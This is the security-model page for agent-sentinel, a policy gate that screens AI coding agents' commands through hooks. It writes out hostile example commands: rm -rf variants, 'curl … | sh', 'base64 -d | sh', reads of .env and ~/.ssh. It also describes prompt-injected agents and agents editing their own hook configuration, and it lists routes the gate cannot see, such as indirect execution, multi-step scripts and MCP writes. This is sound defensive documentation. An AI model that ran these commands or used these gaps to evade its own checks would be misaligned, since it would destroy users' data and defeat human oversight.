# Security model

agent-sentinel is a **policy gate at execution boundaries**. It decides about
the actions it is shown. It is not a sandbox, and it does not claim to be one.

This page states what it protects against, how, and — just as important —
what it does not.

## The five layers, and what v0.1 implements

| layer | v0.1 | what that means |
|---|---|---|
| **Policy evaluation** | ✅ yes | Every action routed through sentinel is analyzed and decided by your policy (`allow` / `confirm` / `deny`). |
| **Command interception** | ⚠️ at supported boundaries | Commands are intercepted when they go through `sentinel run` or an agent hook (Claude Code, Codex). Commands that never reach sentinel are not seen. |
| **Filesystem monitoring** | ❌ no | Paths are checked when they *appear in an action* (`cat .env`, a `Read` tool call). A program that opens files on its own (`python script.py` reading `.env`) is not observed. |
| **Network interception** | ❌ no | Network *commands* are recognized from their arguments (`curl`, `wget`, `git clone`, `ssh`, `scp`, URLs in inline code, `WebFetch`). No traffic is intercepted; a program that opens its own connections is not seen. |
| **OS-level isolation** | ❌ no | No namespaces, seccomp, Seatbelt, or containers. Combine sentinel with a sandbox (a dev container, Codex's sandbox modes, Claude Code's sandboxing) if you need containment. |

## Where sentinel sits

```
             ┌──────────── routed through sentinel ────────────┐
agent ──►    │ Claude Code PreToolUse hook   (enforced by agent)│ ──► policy ──► allow / ask / deny
             │ Codex PreToolUse hook         (enforced by agent)│
             │ sentinel run <command>        (voluntary wrapper)│
             │ sentinel hook generic         (your harness)     │
             └──────────────────────────────────────────────────┘
agent ──► anything else ─────────────────────────────────────────────────► not seen
```

With an agent hook, the agent itself calls sentinel before each tool call; the
agent cannot skip it without changing its own configuration (which sentinel
blocks when that change goes through a routed tool — see *Self-protection*).
`sentinel run` only protects commands that are actually run through it.

## Threat model

### In scope

sentinel is designed to stop, at the boundaries above:

- **Honest mistakes by a capable agent**: `rm -rf` on the wrong directory,
  `git push --force` to `main`, `git reset --hard` over uncommitted work,
  `terraform destroy`, `DROP TABLE`.
- **A prompt-injected agent** trying to exfiltrate or destroy through its
  tools: reading `.env` or `~/.ssh`, dumping the environment, uploading files,
  `curl … | sh`, persistence via shell startup files, git hooks or cron.
- **Obfuscation within one command line**. The analyzer parses the command
  instead of matching strings, so these are all seen as `rm -rf`:
  `rm -fr`, `rm -r -f`, `/bin/rm`, `\rm`, `'r'm`, `RM` (case-insensitive
  filesystems), `$'\x72\x6d'`, `x=rm; $x`, `sudo`/`env`/`nice`/`timeout`/`xargs`
  wrappers, `bash -c '…'`, `eval`, `echo '…' | sh`, heredocs and here-strings
  into shells, `$(…)`, backticks, `find -exec`, `ssh host '…'`, and
  `os.system("…")` inside `python -c`.
- **Commands that cannot be resolved statically** — `$(echo rm) -rf /`,
  `eval "$PAYLOAD"`, `base64 -d | sh`, unterminated quotes, excessive nesting —
  are reported as `exec.obfuscated` instead of being treated as harmless.
- **Tampering with sentinel** through routed tools (see below).
- **Attacks on the confirmation prompt**: terminal escape sequences, bidi
  overrides and zero-width characters in commands are rendered as visible
  escapes; the prompt never reads stdin, so an agent cannot pipe in its own
  approval.

### Out of scope

sentinel v0.1 does **not** protect against:

- **Indirect execution.** `npm test`, `make`, `python app.py`, git hooks and
  package install scripts run code sentinel never reads. A malicious test file
  can do anything the test runner can.
- **Multi-step attacks** where each step is harmless on its own, for example
  writing a script with a file tool and executing it later. (Content written
  through file tools is scanned for secrets, not analyzed as a program.)
- **An agent with write access outside routed tools**, e.g. through an MCP
  server that writes files. Such an agent could edit the policy or forge a
  session grant.
- **Actions that never reach sentinel**: agents without a hook configured,
  commands typed inside an interactive shell started by `sentinel run bash`,
  background processes.
- **Time-of-check/time-of-use races.** A file can change between the check
  and the execution (e.g. a symlink swapped in between).
- **Shell constructs outside the model**: aliases and functions defined in the
  user's shell configuration, `case` statements (reported as unsupported),
  cmd.exe and PowerShell syntax (the parser is POSIX/bash).
- **Denial of service** against the agent: a strict policy can block useful
  work. That is a policy choice.

## Design decisions

**Fail closed where nobody can be asked.** A `confirm` decision without an
interactive terminal becomes a denial. Inside an agent's TUI (detected via
`CLAUDECODE` / `AI_AGENT`), `sentinel run` does not prompt on the shared
terminal — the agent would race it for keystrokes — and denies instead;
confirmations there go through the agent's own prompt via the hook.

**Hooks never fail open by accident.** Claude Code and Codex proceed when a
hook crashes, times out or exits non-zero. sentinel therefore answers every
request, including malformed input, a broken policy, and internal panics:
Claude Code gets `ask`, Codex gets `deny` (Codex does not support `ask` and
would otherwise proceed). Unparseable JSON is not an allow.

**sentinel never grants permissions.** For Claude Code, `allow` produces no
output, so Claude Code's own permission rules still apply. sentinel can only
add restrictions.

**Most restrictive wins.** Rules are combined by precedence
(deny > confirm > allow > default), not by order, so an `allow` rule can never
cancel a `deny`. Restrictive rules match if *any* part of a compound command
matches; `allow` rules only if *every* part matches, so a rule written for
`npm test` does not allow `npm test && curl evil | sh`.

**Unknown is treated as dangerous.** An unresolvable push target counts as a
protected branch. A dynamic delete target is a recursive delete. A misspelled
policy key or a `finding:` pattern that matches nothing is a load error, not a
silently broader rule. A policy that fails to load is an error for
`sentinel run` (nothing is executed) and an `ask`/`deny` for hooks.

**Secrets are never shown or stored.** Commands are redacted before they are
written to the audit log or displayed. File contents are scanned for secret
*names* (`DATABASE_URL`, `Stripe secret key`) and never stored. Session grants
are stored as SHA-256 hashes, not command text.

**Bounded file inspection.** To classify an action, sentinel may read files
the action references: at most 256 KiB of files up to 1 MiB, `.git/HEAD` to
resolve the current branch, and directory listings for globs and recursive
grep (capped at 2000 entries). It resolves symlinks, so `ln -s .env notes;
cat notes` is still a secret read.

## Self-protection

The finding `sentinel.tamper` (denied by the default policy) covers, when done
through a routed command or file tool:

- writing, moving or deleting anything under a `.sentinel/` directory
- writing sentinel's config and state directories (audit log, session grants)
- writing agent hook configuration: `.claude/settings*.json`,
  `.codex/hooks.json`, `.codex/config.toml`, `.cursor/hooks.json`,
  `.gemini/settings.json`
- setting `SENTINEL_*` environment variables, or running `sentinel init`
  as the agent

This is detection at the boundary, not access control. For stronger
guarantees, make the policy file read-only for the account the agent runs
under, or run the agent in a container that mounts it read-only.

## Audit log

`~/.local/state/agent-sentinel/audit.jsonl` (or `$XDG_STATE_HOME`,
`%LOCALAPPDATA%` on Windows, `$SENTINEL_HOME` if set). Created `0600` in a
`0700` directory, appended under an exclusive file lock. It is a record, not a
tamper-proof ledger: anyone with write access to your home directory can edit
it. Log rotation is not implemented in v0.1.

## Reporting vulnerabilities

See [SECURITY.md](../SECURITY.md). Bypasses of the analyzer (a command that
does something dangerous and is not reported) are security bugs; please
report them.
